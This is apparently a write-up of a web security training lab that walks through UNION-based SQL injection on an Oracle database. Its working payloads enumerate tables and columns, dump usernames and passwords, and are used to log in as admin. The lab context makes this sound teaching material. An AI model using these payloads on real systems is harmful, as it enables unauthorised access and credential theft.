# Lab: SQL injection attack, listing the database contents on Oracle

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/d301369a-6ba1-409f-a02d-043cfea274a2)

## Solution

The webpage has a vulnerability in the product category filter.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/cd4a4471-20c9-423d-8576-821181f25f0b)

Use the payload `'+UNION+SELECT+NULL,NULL+FROM+dual--` to find out the rows being returned and there are two rows being returned.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/af192298-6fe2-40e7-bae5-6c03254f6304)

Use payload `'+UNION+SELECT+'abc','def'+FROM+dual--` and both rows being returned are strings.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/fc74a2df-b986-4f86-95cb-7c82961e8235)

Use payload `'+UNION+SELECT+table_name,NULL+FROM+all_tables--` to find out all the tables and one of the tables returned is `USERS_PNZEPP`.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/47e8b125-ef50-4bc5-ba4a-d17589ccccb4)
USERS_PNZEPP

Use the payload `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_PNZEPP'--` to find all columns in the users table.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a8d7fdbc-b407-481d-babe-016af3d2f886)

Use the payload `'+UNION+SELECT+USERNAME_UEKCLC,+PASSWORD_HTBMFZ+FROM+USERS_PNZEPP--` to retrieve all the username along with their passwords and one of them is the admin username and password.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/bc7ff7d2-0dd2-4814-baf3-7d653a2cc2b8)

Use the admin login credentials to log in as admin and finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/ab4c0643-2612-40fc-bf83-ff64a317d191)
